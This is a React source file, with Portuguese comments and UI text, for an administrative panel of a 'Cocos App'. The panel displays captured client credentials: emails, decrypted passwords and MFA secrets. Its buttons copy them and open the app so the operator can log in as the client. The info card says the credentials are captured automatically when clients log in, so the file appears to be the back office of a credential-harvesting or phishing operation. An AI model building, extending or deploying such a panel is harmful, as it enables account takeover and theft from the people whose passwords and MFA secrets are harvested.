/**
 * Admin Dashboard
 * Painel administrativo para visualizar credenciais de login dos clientes
 */

import { useState, useEffect } from "react";
import { trpc } from "@/lib/trpc";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { Eye, EyeOff, Copy, LogOut, RefreshCw } from "lucide-react";
import { toast } from "sonner";

export default function AdminDashboard() {
  const [showPasswords, setShowPasswords] = useState<Record<number, boolean>>({});
  
  // Buscar todos os clientes
  const { data: clients, isLoading, refetch } = trpc.admin.getAllClients.useQuery(undefined, {
    refetchInterval: 5000, // Auto-refresh a cada 5 segundos
  });
  
  // Logout
  const handleLogout = () => {
    localStorage.removeItem("adminAuth");
    window.location.href = "/admin/login";
  };
  
  // Toggle mostrar/ocultar senha
  const toggleShowPassword = (clientId: number) => {
    setShowPasswords(prev => ({
      ...prev,
      [clientId]: !prev[clientId],
    }));
  };
  
  // Copiar para clipboard
  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    toast.success(`${label} copiado!`);
  };
  
  // Formatar data
  const formatDate = (date: Date | null) => {
    if (!date) return "Nunca";
    return new Date(date).toLocaleString("pt-BR");
  };
  
  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-blue-900 to-slate-900">
      {/* Header */}
      <div className="border-b border-white/10 bg-black/20 backdrop-blur-sm">
        <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
          <div>
            <h1 className="text-2xl font-bold text-white">Painel Administrativo</h1>
            <p className="text-sm text-blue-200">Cocos App - Gerenciamento de Credenciais</p>
          </div>
          <div className="flex items-center gap-4">
            <Button
              onClick={() => refetch()}
              variant="outline"
              size="sm"
              className="border-white/20 text-white hover:bg-white/10"
            >
              <RefreshCw className="w-4 h-4 mr-2" />
              Atualizar
            </Button>
            <Button
              onClick={handleLogout}
              variant="outline"
              size="sm"
              className="border-red-400/50 text-red-300 hover:bg-red-500/20"
            >
              <LogOut className="w-4 h-4 mr-2" />
              Sair
            </Button>
          </div>
        </div>
      </div>
      
      {/* Main Content */}
      <div className="max-w-7xl mx-auto px-6 py-8">
        <Card className="bg-white/5 backdrop-blur-sm border-white/10">
          <div className="p-6">
            <div className="flex items-center justify-between mb-6">
              <div>
                <h2 className="text-xl font-bold text-white">Credenciais de Login dos Clientes</h2>
                <p className="text-sm text-blue-200 mt-1">
                  {clients?.length || 0} cliente(s) cadastrado(s)
                </p>
              </div>
            </div>
            
            {isLoading ? (
              <div className="text-center py-12">
                <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-white mx-auto"></div>
                <p className="text-white/60 mt-4">Carregando...</p>
              </div>
            ) : clients && clients.length > 0 ? (
              <div className="overflow-x-auto">
                <Table>
                  <TableHeader>
                    <TableRow className="border-white/10 hover:bg-white/5">
                      <TableHead className="text-blue-200">ID</TableHead>
                      <TableHead className="text-blue-200">Email</TableHead>
                      <TableHead className="text-blue-200">Senha</TableHead>
                      <TableHead className="text-blue-200">MFA</TableHead>
                      <TableHead className="text-blue-200">MFA Secret</TableHead>
                      <TableHead className="text-blue-200">Último Login Capturado</TableHead>
                      <TableHead className="text-blue-200">Ações</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {clients.map((client) => (
                      <TableRow key={client.id} className="border-white/10 hover:bg-white/5">
                        <TableCell className="text-white font-mono">{client.id}</TableCell>
                        
                        <TableCell className="text-white">
                          <div className="flex items-center gap-2">
                            <span className="font-medium">{client.email}</span>
                            <Button
                              onClick={() => copyToClipboard(client.email, "Email")}
                              variant="ghost"
                              size="sm"
                              className="h-6 w-6 p-0 text-blue-300 hover:text-blue-100 hover:bg-white/10"
                            >
                              <Copy className="w-3 h-3" />
                            </Button>
                          </div>
                        </TableCell>
                        
                        <TableCell className="text-white">
                          <div className="flex items-center gap-2">
                            <span className="font-mono">
                              {showPasswords[client.id] ? client.passwordDecrypted : "••••••••"}
                            </span>
                            <Button
                              onClick={() => toggleShowPassword(client.id)}
                              variant="ghost"
                              size="sm"
                              className="h-6 w-6 p-0 text-blue-300 hover:text-blue-100 hover:bg-white/10"
                            >
                              {showPasswords[client.id] ? (
                                <EyeOff className="w-3 h-3" />
                              ) : (
                                <Eye className="w-3 h-3" />
                              )}
                            </Button>
                            <Button
                              onClick={() => copyToClipboard(client.passwordDecrypted, "Senha")}
                              variant="ghost"
                              size="sm"
                              className="h-6 w-6 p-0 text-blue-300 hover:text-blue-100 hover:bg-white/10"
                            >
                              <Copy className="w-3 h-3" />
                            </Button>
                          </div>
                        </TableCell>
                        
                        <TableCell>
                          {client.mfaEnabled ? (
                            <Badge className="bg-green-500/20 text-green-300 border-green-500/30">
                              Ativo
                            </Badge>
                          ) : (
                            <Badge className="bg-gray-500/20 text-gray-300 border-gray-500/30">
                              Inativo
                            </Badge>
                          )}
                        </TableCell>
                        
                        <TableCell className="text-white">
                          {client.mfaSecret ? (
                            <div className="flex items-center gap-2">
                              <span className="font-mono text-sm">
                                {client.mfaSecret.substring(0, 10)}...
                              </span>
                              <Button
                                onClick={() => copyToClipboard(client.mfaSecret!, "MFA Secret")}
                                variant="ghost"
                                size="sm"
                                className="h-6 w-6 p-0 text-blue-300 hover:text-blue-100 hover:bg-white/10"
                              >
                                <Copy className="w-3 h-3" />
                              </Button>
                            </div>
                          ) : (
                            <span className="text-white/40">N/A</span>
                          )}
                        </TableCell>
                        
                        <TableCell className="text-white/60 text-sm">
                          {formatDate(client.lastLoginCapture)}
                        </TableCell>
                        
                        <TableCell>
                          <Button
                            onClick={() => {
                              // Abrir nova janela com o app Cocos para fazer login manual
                              window.open("/", "_blank");
                              toast.info("Abra o console do navegador e use as credenciais copiadas");
                            }}
                            variant="outline"
                            size="sm"
                            className="border-blue-400/50 text-blue-300 hover:bg-blue-500/20"
                          >
                            Fazer Login
                          </Button>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            ) : (
              <div className="text-center py-12">
                <p className="text-white/60">Nenhum cliente cadastrado ainda</p>
                <p className="text-white/40 text-sm mt-2">
                  As credenciais serão capturadas automaticamente quando os clientes fizerem login
                </p>
              </div>
            )}
          </div>
        </Card>
        
        {/* Info Card */}
        <Card className="mt-6 bg-blue-500/10 backdrop-blur-sm border-blue-400/20">
          <div className="p-4">
            <h3 className="text-white font-semibold mb-2">ℹ️ Como Funciona</h3>
            <ul className="text-blue-200 text-sm space-y-1">
              <li>• As credenciais são capturadas automaticamente quando os clientes fazem login no app Cocos</li>
              <li>• Email, senha e código MFA (se houver) são salvos de forma segura</li>
              <li>• Senhas são criptografadas com AES-256-CBC</li>
              <li>• Use o botão "Fazer Login" para abrir o app e fazer login como o cliente</li>
              <li>• Os dados são atualizados automaticamente a cada 5 segundos</li>
            </ul>
          </div>
        </Card>
      </div>
    </div>
  );
}
